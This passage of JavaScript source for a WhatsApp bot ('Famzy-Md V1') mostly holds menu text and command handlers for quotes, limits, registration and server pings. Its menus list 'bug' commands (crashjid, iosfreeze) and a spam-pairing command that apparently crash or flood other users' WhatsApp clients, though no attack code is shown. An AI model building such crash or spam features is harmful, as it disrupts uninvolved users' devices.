│ • ${prefix}ᴛɪᴋᴛᴏᴋᴠɪᴅᴇᴏ Ⓛ︎
│ • ${prefix}ᴛɪᴋᴛᴏᴋꜱʟɪᴅᴇ Ⓛ︎
│ • ${prefix}ɢᴅʀɪᴠᴇ Ⓛ︎
│ • ${prefix}ᴍᴇᴅɪᴀꜰɪʀᴇ Ⓛ︎
│ • ${prefix}ꜱꜰɪʟᴇᴅʟ Ⓛ︎
└───···

⛃ A I  M E N U
│ • ${prefix}ai ᴏɴ/ᴏꜰꜰ
└───···

⛃ G R O U P  M E N U
│ • ${prefix}ᴀꜰᴋ
│ • ${prefix}ʜɪᴅᴇᴛᴀɢ
│ • ${prefix}ᴋɪᴄᴋ
│ • ${prefix}ᴅᴇʟᴇᴛᴇ
│ • ${prefix}ᴀɴᴛɪʟɪɴᴋɢᴄ ᴏɴ/ᴏꜰꜰ
└───···

⛃ I N F O  M E N U
│ • ${prefix}ꜱᴄʀɪᴘᴛ
│ • ${prefix}ᴘɪɴɢ
└───···

⛃ S E A R C H  M E N U
│ • ${prefix}ᴘʟᴀʏ Ⓛ︎
│ • ${prefix}ᴘɪɴᴛᴇʀᴇꜱᴛ Ⓛ︎
│ • ${prefix}ʏᴛꜱᴇᴀʀᴄʜ Ⓛ︎
└───···

⛃ B U G  M E N U
│ • ${prefix}ᴏʀɪʙᴜɢ
│ • ${prefix}ᴄʀᴀꜱʜᴊɪᴅ
└───···

⛃ Q U O T E S  M E N U
│ • ${prefix}Qᴜᴏᴛᴇꜱᴀɴɪᴍᴇ
│ • ${prefix}Qᴜᴏᴛᴇᴅʙᴀᴄᴏᴛ
└───···
`)
} else if (args[0] === "owner") {
return replymenu(`ʜᴇʏ \`${pushname}\` 👋🏼
${ucapanWaktu}

⛃ *ᴜ ꜱ ᴇ ʀ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ* 📖
⛃ \`ʟɪᴍɪᴛ\` : ${db.data.users[sender].limit}
⛃ \`sᴛᴀᴛᴜꜱ ᴜꜱᴇʀ\` : ${isPremium ? 'premium' : 'free user'}

⛃ *ʙ ᴏ ᴛ ᴢ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ*
⛃ Ⓛ︎ = ʟɪᴍɪᴛ Ⓟ︎ = ᴘʀᴇᴍɪᴜᴍ 
⛃ \`ᴠᴇʀꜱɪᴏɴ\` : Fᴀᴍᴢʏ-Mᴅ V1 
⛃ \`ᴛᴏᴛᴀʟ ꜰᴇᴀᴛᴜʀᴇꜱ\` : ${totalFitur()}
⛃ \`ʀᴜɴᴛɪᴍᴇ\` : ${runtime(process.uptime())}
⛃ \`ᴅᴀᴛᴇ*\` : ${date}

⛃ O W N E R  M E N U
│ • ${prefix}ʙᴀᴄᴋᴜᴘ
│ • ${prefix}ʀᴇꜱᴛᴀʀᴛ
│ • ${prefix}ᴀᴅᴅʟɪᴍɪᴛ
│ • ${prefix}ꜱᴇʟꜰ/ᴘᴜʙʟɪᴄ
│ • ${prefix}ᴄᴜꜱᴛᴏᴍꜱɴ
│ • ${prefix}ᴇɴᴄ
│ • ${prefix}ꜱᴘᴀᴍ-ᴘᴀɪʀɴɢ
│ • ${prefix}ʙᴄɢᴄ
│ • ${prefix}ᴄʟᴇᴀʀꜱᴇꜱꜱɪᴏɴ
│ • ${prefix}ᴍᴀᴋᴇᴀɢɪꜰᴛ
│ • ${prefix}ʟɪꜱᴛɢɪꜰᴛꜱ
│ • ${prefix}ᴊᴏɪɴɢᴄ
└───···`)
} else if (args[0] === "main") {
return replymenu(`ʜᴇʏ \`${pushname}\` 👋🏼
${ucapanWaktu}

⛃ *ᴜ ꜱ ᴇ ʀ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ* 📖
⛃ \`ʟɪᴍɪᴛ\` : ${db.data.users[sender].limit}
⛃ \`sᴛᴀᴛᴜꜱ ᴜꜱᴇʀ\` : ${isPremium ? 'premium' : 'free user'}

⛃ *ʙ ᴏ ᴛ ᴢ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ*
⛃ Ⓛ︎ = ʟɪᴍɪᴛ Ⓟ︎ = ᴘʀᴇᴍɪᴜᴍ 
⛃ \`ᴠᴇʀꜱɪᴏɴ\` : Fᴀᴍᴢʏ-Mᴅ V1 
⛃ \`ᴛᴏᴛᴀʟ ꜰᴇᴀᴛᴜʀᴇꜱ\` : ${totalFitur()}
⛃ \`ʀᴜɴᴛɪᴍᴇ\` : ${runtime(process.uptime())}
⛃ \`ᴅᴀᴛᴇ\` : ${date}

⛃ M A I N  M E N U
│ • ${prefix}ʀᴇᴘᴏʀᴛʙᴜɢ
│ • ${prefix}ʀᴇQᴜᴇꜱᴛ
│ • ${prefix}ᴄᴇᴋʟɪᴍɪᴛ
│ • ${prefix}ᴄᴇᴋꜱɴ Ⓛ︎
│ • ${prefix}ᴅᴀꜰᴛᴀʀ
│ • ${prefix}ᴜɴʀᴇɢɪꜱᴛᴇʀ
│ • ${prefix}ʀᴇᴅᴇᴇᴍᴄᴏᴅᴇ
│ • ${prefix}ᴄʟᴀɪᴍ/ᴅᴀɪʟʏ
└───···
`)
} else if (args[0] === "tools") {
return replymenu(`ʜᴇʏ \`${pushname}\` 👋🏼
${ucapanWaktu}

⛃ *ᴜ ꜱ ᴇ ʀ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ* 📖
⛃ \`ʟɪᴍɪᴛ\` : ${db.data.users[sender].limit}
⛃ \`sᴛᴀᴛᴜꜱ ᴜꜱᴇʀ\` : ${isPremium ? 'premium' : 'free user'}

⛃ *ʙ ᴏ ᴛ ᴢ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ*
⛃ Ⓛ︎ = ʟɪᴍɪᴛ Ⓟ︎ = ᴘʀᴇᴍɪᴜᴍ 
⛃ \`ᴠᴇʀꜱɪᴏɴ\` : Fᴀᴍᴢʏ-Mᴅ V1 
⛃ \`ᴛᴏᴛᴀʟ ꜰᴇᴀᴛᴜʀᴇꜱ\` : ${totalFitur()}
⛃ \`ʀᴜɴᴛɪᴍᴇ\` : ${runtime(process.uptime())}
⛃ \`ᴅᴀᴛᴇ\` : ${date}

⛃  T O O L S  M E N U
│ • ${prefix}ʜᴅ Ⓛ︎
│ • ${prefix}ʀᴇᴍɪɴɪ Ⓛ︎
│ • ${prefix}ᴛᴏᴜʀʟ Ⓛ︎
│ • ${prefix}ʀᴇᴀᴅᴠɪᴇᴡᴏɴᴄᴇ Ⓛ︎
│ • ${prefix}ꜱᴍᴇᴍᴇ
│ • ${prefix}ꜱᴛɪᴄᴋᴇʀ
│ • ${prefix}ᴇᴍᴏᴊɪᴍɪx
│ • ${prefix}ᴇᴍᴏᴊɪᴍɪx2
└───···
`)
} else if (args[0] === "download") {
return replymenu(`ʜᴇʏ \`${pushname}\` 👋🏼

${ucapanWaktu}
⛃ *ᴜ ꜱ ᴇ ʀ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ* 📖
⛃ \`ʟɪᴍɪᴛ\` : ${db.data.users[sender].limit}
⛃ \`sᴛᴀᴛᴜꜱ ᴜꜱᴇʀ\` : ${isPremium ? 'premium' : 'free user'}

⛃ *ʙ ᴏ ᴛ ᴢ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ*
⛃ Ⓛ︎ = ʟɪᴍɪᴛ Ⓟ︎ = ᴘʀᴇᴍɪᴜᴍ 
⛃ \`ᴠᴇʀꜱɪᴏɴ\` : Fᴀᴍᴢʏ-Mᴅ V1 
⛃ \`ᴛᴏᴛᴀʟ ꜰᴇᴀᴛᴜʀᴇꜱ\` : ${totalFitur()}
⛃ \`ʀᴜɴᴛɪᴍᴇ\` : ${runtime(process.uptime())}
⛃ \`ᴅᴀᴛᴇ\` : ${date}

⛃ D O W N L O A D  M E N U
│ • ${prefix}ᴘʟᴀʏ Ⓛ︎
│ • ${prefix}ᴛɪᴋᴛᴏᴋᴠɪᴅᴇᴏ Ⓛ︎
│ • ${prefix}ᴛɪᴋᴛᴏᴋꜱʟɪᴅᴇ Ⓛ︎
│ • ${prefix}ɢᴅʀɪᴠᴇ Ⓛ︎
│ • ${prefix}ᴍᴇᴅɪᴀꜰɪʀᴇ Ⓛ︎
│ • ${prefix}ꜱꜰɪʟᴇᴅʟ Ⓛ︎
└───···
`)

} else if (args[0] === "ai") {
return replymenu(`ʜᴇʏ \`${pushname}\` 👋🏼
${ucapanWaktu}

⛃ *I N F O R M A T I O N* 📖
⛃ ʟɪᴍɪᴛ : ${db.data.users[sender].limit}
⛃ sᴛᴀᴛᴜꜱ ᴜꜱᴇʀ : ${isPremium ? 'premium' : 'free user'}
⛃ Ⓛ︎ = ʟɪᴍɪᴛ Ⓟ︎ = ᴘʀᴇᴍɪᴜᴍ 
⛃ ᴅᴀᴛᴇ : ${date}

⛃ A I  M E N U
│ • ${prefix}ᴀɪ ᴏɴ/ᴏꜰᴛ
└───···
`)
} else if (args[0] === "group") {
return replymenu(`ʜᴇʏ \`${pushname}\` 👋🏼
${ucapanWaktu}

⛃ *ᴜ ꜱ ᴇ ʀ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ* 📖
⛃ \`ʟɪᴍɪᴛ\` : ${db.data.users[sender].limit}
⛃ \`sᴛᴀᴛᴜꜱ ᴜꜱᴇʀ\` : ${isPremium ? 'premium' : 'free user'}

⛃ *ʙ ᴏ ᴛ ᴢ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ*
⛃ Ⓛ︎ = ʟɪᴍɪᴛ Ⓟ︎ = ᴘʀᴇᴍɪᴜᴍ 
⛃ \`ᴠᴇʀꜱɪᴏɴ\` : Fᴀᴍᴢʏ-Mᴅ V1 
⛃ \`ᴛᴏᴛᴀʟ ꜰᴇᴀᴛᴜʀᴇꜱ\` : ${totalFitur()}
⛃ \`ʀᴜɴᴛɪᴍᴇ\` : ${runtime(process.uptime())}
⛃ \`ᴅᴀᴛᴇ\` : ${date}

⛃ G R O U P  M E N U
│ • ${prefix}ᴀꜰᴋ
│ • ${prefix}ʜɪᴅᴇᴛᴀɢᴇ
│ • ${prefix}ᴋɪᴄᴋ
│ • ${prefix}ᴅᴇʟᴇᴛᴇ
│ • ${prefix}ᴀɴᴛɪʟɪɴᴋɢᴄ [ N O  K I C K ]
└───···
`)
} else if (args[0] === "info") {
return replymenu(`ʜᴇʏ \`${pushname}\` 👋🏼
${ucapanWaktu}

⛃ *ᴜ ꜱ ᴇ ʀ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ* 📖
⛃ \`ʟɪᴍɪᴛ\` : ${db.data.users[sender].limit}
⛃ \`sᴛᴀᴛᴜꜱ ᴜꜱᴇʀ\` : ${isPremium ? 'premium' : 'free user'}

⛃ *ʙ ᴏ ᴛ ᴢ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ*
⛃ Ⓛ︎ = ʟɪᴍɪᴛ Ⓟ︎ = ᴘʀᴇᴍɪᴜᴍ 
⛃ \`ᴠᴇʀꜱɪᴏɴ\` : Fᴀᴍᴢʏ-Mᴅ V1 
⛃ \`ᴛᴏᴛᴀʟ ꜰᴇᴀᴛᴜʀᴇꜱ\` : ${totalFitur()}
⛃ \`ʀᴜɴᴛɪᴍᴇ\` : ${runtime(process.uptime())}
⛃ \`ᴅᴀᴛᴇ\` : ${date}

⛃ I N F O  M E N U
│ • ${prefix}ꜱᴄʀɪᴘᴛ
│ • ${prefix}ᴘɪɴɢ
└───···
`)
} else if (args[0] === "search") {
return replymenu(`ʜᴇʏ \`${pushname}\` 👋🏼
${ucapanWaktu}

⛃ *ᴜ ꜱ ᴇ ʀ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ* 📖
⛃ \`ʟɪᴍɪᴛ\` : ${db.data.users[sender].limit}
⛃ \`sᴛᴀᴛᴜꜱ ᴜꜱᴇʀ\` : ${isPremium ? 'premium' : 'free user'}

⛃ *ʙ ᴏ ᴛ ᴢ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ*
⛃ Ⓛ︎ = ʟɪᴍɪᴛ Ⓟ︎ = ᴘʀᴇᴍɪᴜᴍ 
⛃ \`ᴠᴇʀꜱɪᴏɴ\` : Fᴀᴍᴢʏ-Mᴅ V1 
⛃ \`ᴛᴏᴛᴀʟ ꜰᴇᴀᴛᴜʀᴇꜱ\` : ${totalFitur()}
⛃ \`ʀᴜɴᴛɪᴍᴇ\` : ${runtime(process.uptime())}
⛃ \`ᴅᴀᴛᴇ\` : ${date}

⛃ S E A R C H  M E N U
│ • ${prefix}ᴘʟᴀʏ Ⓛ︎
│ • ${prefix}ᴘɪɴᴛᴇʀᴇꜱᴛ Ⓛ︎
│ • ${prefix}ʏᴛꜱᴇᴀʀᴄʜ Ⓛ︎
└───···`)
} else if (args[0] === "bug") {
return replymenu(`ʜᴇʏ \`${pushname}\` 👋🏼
${ucapanWaktu}

⛃ *ᴜ ꜱ ᴇ ʀ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ* 📖
⛃ \`ʟɪᴍɪᴛ\` : ${db.data.users[sender].limit}
⛃ \`sᴛᴀᴛᴜꜱ ᴜꜱᴇʀ\` : ${isPremium ? 'premium' : 'free user'}

⛃ *ʙ ᴏ ᴛ ᴢ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ*
⛃ Ⓛ︎ = ʟɪᴍɪᴛ Ⓟ︎ = ᴘʀᴇᴍɪᴜᴍ 
⛃ \`ᴠᴇʀꜱɪᴏɴ\` : Fᴀᴍᴢʏ-Mᴅ V1 
⛃ \`ᴛᴏᴛᴀʟ ꜰᴇᴀᴛᴜʀᴇꜱ\` : ${totalFitur()}
⛃ \`ʀᴜɴᴛɪᴍᴇ\` : ${runtime(process.uptime())}
⛃ \`ᴅᴀᴛᴇ\` : ${date}

⛃ B U G  M E N U
│ • ${prefix}ᴏʀɪʙᴜɢ
│ • ${prefix}ᴄʀᴀꜱʜᴊɪᴅ
│ • ${prefix}ɪᴏꜱꜰʀᴇᴢᴇ
└───···`)
} else if (args[0] === "quotes") {
return replymenu(`ʜᴇʏ \`${pushname}\` 👋🏼
${ucapanWaktu}

⛃ *ᴜ ꜱ ᴇ ʀ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ* 📖
⛃ \`ʟɪᴍɪᴛ\` : ${db.data.users[sender].limit}
⛃ \`sᴛᴀᴛᴜꜱ ᴜꜱᴇʀ\` : ${isPremium ? 'premium' : 'free user'}

⛃ *B O T  I N F O R M A T I O N*
⛃ Ⓛ︎ = ʟɪᴍɪᴛ Ⓟ︎ = ᴘʀᴇᴍɪᴜᴍ 
⛃ \`ᴠᴇʀꜱɪᴏɴ\` : Fᴀᴍᴢʏ-Mᴅ V1 
⛃ \`ᴛᴏᴛᴀʟ ꜰᴇᴀᴛᴜʀᴇꜱ\` : ${totalFitur()}
⛃ \`ʀᴜɴᴛɪᴍᴇ\` : ${runtime(process.uptime())}
⛃ \`ᴅᴀᴛᴇ\` : ${date}

⛃ Q U O T E S  M E N U 
│ • ${prefix}Qᴜᴏᴛᴇꜱᴀɴɪᴍᴇ Ⓛ︎
│ • ${prefix}Qᴜᴏᴛᴇꜱʙᴀᴄᴏᴛ Ⓛ︎
└───···`)
}
}
break
case 'quotesbacot': {
pengguna()
if (users.limit < 1) return reply(`[ ! ] YOUR LIMIT IS LESS THAN 1`)
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const bacot = [
'Do you like coffee? I do. Do you know why? Coffee is like you, its bitter but addictive so you want more.',
'Payday is like an ex, right? Usually it only lasts a short time.',
'The Hajj said that boys who dont want to go to Friday prayers are told to wear skirts.',
'Do you know your ex? An ex is like a paycheck, they usually pass through our lives.',
'I like you, you like him, but he doesnt like you. Hahaha, funny huh? Love is this complicated.',
'Google is great, right? But unfortunately, no matter how great Google is, it cant find our soul mate.',
'Holding an eyebrow pencil too often can make your eyes go blind, if you poke it into your eyes.',
'I work hard because I know that money doesnt have legs to walk into my pocket on its own.',
'If you cant convince and amaze people with your intelligence, confuse them with your stupidity.',
'No matter how tiring you are at work, you are even more tired when you are unemployed.',
'We live in a time when if we make a mistake we get angry, and if we make a mistake we get called out for being unusual.',
'Dont have a boyfriends shoulder? Dont worry, there is still a shoulder to lean on.',
'Its natural to love yourself, whats not natural is loving your father.',
'They say they cant lie. Of course, eyes can only see.',
'Honey in your right hand, poison in your left hand, your soulmate is still in Gods hands.',
'Cheating doesnt happen because there is intention, cheating happens because your boyfriend is still available.',
'If netizens do thumb exercises on their phones without cooling down, its no wonder their comments are always hot.',
'Your soulmate will never go anywhere, but your rivals will be everywhere.',
'I feel like Im always wrong in your eyes. Then, tomorrow I will move to your nose.',
'There is no need to be ashamed if you are single, being single doesnt mean you are not marketable, but it just means that no one wants you.',
'If your prayers have not been answered, be patient, remember that you are not the only one praying!',
'Still hoping and continuing to hope that in time I will become the hopeful champion.',
'Humans may plan, but in the end it is the balance that determines.',
'His status is spiritual, his behavior is spiritually refined.',
'I wanted to eat meatballs, but it was really hot, it looked like the meatballs were having a fever.',
'I was rich too, when I got my salary.',
'My boyfriend dumped me because we have different beliefs. Im sure Im handsome, but he is not.',
'Your future depends on your dreams, so get plenty of sleep.',
'No matter how heavy your work is, it will be lighter if you dont carry it.',
'Dont expect too much! You will end up getting sick!',
'Remember! You are single',
'Dont know what to type',
]
    let bacotan = pickRandom(bacot)
 reply(bacotan)
}
break
case 'quotesanime': {
	pengguna()
	if (users.limit < 1) return reply(`[ ! ] YOUR LIMIT IS LESS THAN 1`)
  let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) return await res.text()
  uselimit(1)
  let json = await res.json()
  if(!json.result[0]) return json
  let { indo, character, anime } = json.result[0]
  return reply(`${indo}\n\n📮ʙʏ:  _${character}_ \nᴀɴɪᴍᴇ:\n${anime}`)
}
break
case 'clearall': {
if (!Creator) return reply(mess.owner)
client.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
reaction(m.chat, "✅")
}
break
    case 'totalfitur': case 'totalfeature': {
 return reply(`${totalFitur()}`)
}
break
    case 'claim': case 'daily': {
  pengguna()
 let __timers = (new Date - users.lastclaim)
   let _timers = (86400000 - __timers)
   let timers = clockString(_timers)
   if (new Date - users.lastclaim > 86400000) {
   	client.sendMessage(m.chat, { text: `*ᴅᴀɪʟʏ ᴄʟᴀɪᴍꜱ*\n_ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʟᴀɪᴍꜱ_\n- ʟɪᴍɪᴛ : 3\n\n_ᴄʟᴀɪᴍ ʀᴇꜱᴇᴛ_` }, { quoted: m })
   	users.limit[m.sender].limit += 3
   	users.lastclaim[m.sender].lastclaim = new Date * 1
   } else {
   	client.sendMessage(m.chat, { text: `ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ *⏱️${timers}* ᴀɢᴀɪɴ ᴛᴏ ʙᴇ ᴀʙʟᴇ ᴛᴏ ᴄʟᴀɪᴍ ᴀɢᴀɪɴ` }, { quoted: m })
   }
    }
break
case 'script': case 'sc': case 'repo': {
let Rawwwwr = `ᴛʜɪꜱ ɪꜱ ᴍʏ ʀᴇᴘᴏ 
*Name:* FAMZY_LEE-V1
*Owner:* FAWAZ LEKAN
*Repo Link:* https://github.com/Famzylee12/FAMZY_LEE-V1
*ꜱᴄʀɪᴘᴛᴇᴅ ʙʏ ꜰᴀᴡᴀᴢ ʟᴇᴋᴀɴ*

*ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴀꜱᴋ Qᴜᴇꜱᴛɪᴏɴꜱ, ᴘʟᴇᴀꜱᴇ ᴄʜᴀᴛ :*
> ${owner}

*ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴘʟᴀʏ ᴛʜɪꜱ ʙᴏᴛ :*
> https://chat.whatsapp.com/BQ2ON2itIIpAQSYUSZrrQL_`
 client.relayMessage(m.chat, {
requestPaymentMessage: {
lcurrencyCodeIso4217: 'IDR',
amount1000: 20000 * 20000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: `${Rawwwwr}`,
contextInfo: {
mentionedJid: ['2348127187030' + '@s.whatsapp.net'],
externalAdReply: {
showAdAttribution: true
}
}
}
}
}
}, {})
}
break
case 'remini': case 'hd': {
pengguna()
if (users.limit < 1) return reply(`[ ! ] YOUR LIMIT IS LESS THAN 1`)
if (!quoted) return reply(`ᴡʜᴇʀᴇ ɪꜱ ᴛʜᴇ ᴘɪᴄᴛᴜʀᴇ?`)
if (!/image/.test(mime)) return reply(`ꜱᴇɴᴅ/ʀᴇᴘʟʏ ᴘʜᴏᴛᴏꜱ ᴡɪᴛʜ ᴄᴀᴘᴛɪᴏɴꜱ ${prefix + command}`)
reply(mess.wait)
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance")
let leo = {
  image: proses,
  caption: `ᴅᴏɴᴇ ʙʏ: ${namabot}`,
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: idsaluran,
 newsletterName: `ʜᴅ ʙʏ: ${ownername}`, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: client.decodeJid(client.user.id) },
},
}
await client.sendMessage(m.chat, leo, { quoted: qpayment });
}
uselimit(1)
break
case 'tqto': case 'thankto': {
return reply(`📍 *ᴛʜᴀɴᴋ ᴛᴏ* 📍\n\n
- *ᴀʟʟᴀʜ ꜱᴡᴛ*
- *ꜰᴀᴍᴢʏ ʟᴇᴇ* [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]
- *ꜰᴀᴡᴀᴢ ʟᴇᴋᴀɴ* [ ᴄʀᴇᴀᴛᴏʀ ]
- *ꜰᴀᴡᴀᴢ ʟᴇᴋᴀɴ* [ ʙᴀꜱᴇ ]
- *ꜰᴇᴀᴛᴜʀᴇ ᴘʀᴏᴠɪᴅᴇʀꜱ*
- *ꜱᴜᴘᴘᴏʀᴛᴇʀ*
- ᴘʀᴏᴠɪᴅᴇʀ ᴀᴘɪ`)
}
break
case 'ping': {
pengguna()
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
*ʀᴇꜱᴘᴏɴꜱᴇ ꜱᴘᴇᴇᴅ* ${latensi.toFixed(4)} *_Sᴇᴄᴏɴᴅ_* \n ${oldd - neww} *_ᴍɪʟɪꜱᴇᴄᴏɴᴅꜱ_*\n\n*Rᴜɴᴛɪᴍᴇ* : ${runtime(process.uptime())}

*💻 ɪɴꜰᴏ ꜱᴇʀᴠᴇʀ*
*RAM*: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

*_NᴏᴅᴇJꜱ ᴍᴇᴍᴏʀʏ Uꜱᴀɢᴇ_*
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `*_Tᴏᴛᴀʟ Cᴘᴜ Uꜱᴀɢᴇ_*
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
*_Cᴘᴜ Cᴏʀᴇ(s) Usᴀɢᴇ* (${cpus.length} *Cᴏʀᴇ Cᴘᴜ)_*
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
            }
            break
case "redeemcode": {
pengguna()
if (!args[0]) return reply("Codenya")
if (args[0] !== args[0].toLowerCase()) return reply("*ᴄᴏᴅᴇ ʀᴇᴅᴇᴇᴍ* ᴀʟʟ ʟᴏᴡᴇʀᴄᴀꜱᴇ ʟᴇᴛᴛᴇʀ ʀᴇQᴜɪʀᴇᴅ!")
if (db.data.settings.hadiahkadaluwarsa.includes(args[0])) return reply("*ᴄᴏᴅᴇ* ʜᴀꜱ ʙᴇᴇɴ ᴜꜱᴇᴅ!")
if (!db.data.settings.hadiah.includes(args[0])) return reply("*ᴄᴏᴅᴇ* ɪɴᴠᴀʟɪᴅ!")
db.data.settings.hadiahkadaluwarsa.push(args[0])
var code = db.data.settings.hadiah.indexOf(args[0])
db.data.settings.hadiah.splice(code, 1)
db.data.users[m.sender].limit += 15
var teks = `ᴄᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴ ᴛᴏ @${m.sender.split("@")[0]} 🎉

ʏᴏᴜ ɢᴇᴛ *15 ʟɪᴍɪᴛ* ꜰʀᴏᴍ* ᴄᴏᴅᴇ ʀᴇᴅᴇᴇᴍ "${args[0]}"*`
await reply(`ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ɢᴇᴛ *15 ʟɪᴍɪᴛ* ꜰʀᴏᴍ *ᴄᴏᴅᴇ ʀᴇᴅᴇᴇᴍ ${args[0]}*`).then(() => {
client.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender], externalAdReply: { thumbnailUrl: thumbnail, title: "© Message System Notification", body: null, sourceUrl: 'https://youtube.com/@famzzy_lee', renderLargerThumbnail: true, mediaType: 1}}}, {quoted: qpayment})
})}
break
case 'daftar': { 
  if (users.registered === true) return reply(`*❕ ʏᴏᴜ ᴀʀᴇ ᴀʟʀᴇᴀᴅʏ ʀᴇɢɪꜱᴛᴇʀᴇᴅ*`)
  if (!text) return reply(`ᴇxᴀᴍᴘʟᴇ: .daftar ɴᴀᴍᴇ.ᴀɢᴇ`)
  let t = text.split('.')
  let name = t[0]
  let age = t[1]
  if (!name) return reply(`ᴀɢᴇ ᴄᴀɴɴᴏᴛ ʙᴇ ʙʟᴀɴᴋ`)
  if (!age) return reply(`ᴀɢᴇ ᴄᴀɴɴᴏᴛ ʙᴇ ʙʟᴀɴᴋ`)
  if (isNaN(age)) return reply(`ɪɴᴠᴀʟɪᴅ ᴀɢᴇ`)
  age = parseInt(age);
  if (age > 50) return m.reply('ᴍɪɴɪᴍᴜᴍ ᴀɢᴇ *50* ʏᴇᴀʀꜱ')
  if (age < 5) return m.reply('ᴍɪɴɪᴍᴜᴍ ᴀɢᴇ *5* ʏᴇᴀʀꜱ')
  if (name.split('').length > 100) return m.reply('ᴍᴀxɪᴍᴜᴍ ɴᴀᴍᴇ 100 ᴄʜᴀʀᴀᴄᴛᴇʀ ᴀᴊɢ')
  let sn = generateRandomPassword(10)
  users.nick = name.trim()
  users.age = age
  users.registered = true
  users.limit += 30
  users.sn = sn
  users.regTime = +new Date
    
 reply(`
┏─• *USER*
│◉ *sᴛᴀᴛᴜs:* ☑️ sᴜᴄᴄᴇssғᴜʟ
│◉ *ɴᴀᴍᴇ:* ${name}
│◉ *ᴀɢᴇ:* ${age} ʏᴇᴀʀs
┗───•
 ◉ *SN:* ${sn}
 ◉ *LIMIT:* + 30 BONUS BEGINNING
`)
}
break
case 'ceksn': {
pengguna()
await uselimit(1)
return reply(`${users.sn}`)
}
break
case 'unregister': {
  if (!args[0]) return reply(`*• Example:* ${prefix + command} *[ꜱᴇʀɪᴀʟ ɴᴜᴍʙᴇʀ]*`)
  let user = global.db.data.users[m.sender]
  if (args[0] !== users.sn) return reply('*[ x ] ɪɴᴠᴀʟɪᴅ ꜱᴇʀɪᴀʟ ɴᴜᴍʙᴇʀ*')
   let __waktuh = (new Date - global.db.data.users[m.sender].regTime)
   let _waktuh = (+ 86400000 - __waktuh)
   let waktuh = clockString(_waktuh)
  /* if (new Date - global.db.data.users[m.sender].unreglast > + 86400000) {*/
   user.regTime = new Date * 1
  user.registered = false
  user.age = 0
  user.limit = 0
  m.reply(`[ ✓ ] ᴜɴʀᴇɢɪꜱᴛᴇʀᴇᴅ ꜱᴇᴄᴄᴇꜱꜱꜰᴜʟʟʏ!`)
 /* } else m.reply(`[ x ] You have *${prefix + command}*.\nPlease wait *${time}* to get *${prefix + command}* back.`)*/
}
break        
case 'ceklimit': {
pengguna
let a = db.data.users[m.sender]
reply(`*YOUR LIMIT IS IN AMOUNT ${a.limit} LIMIT*`)
}
break
case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
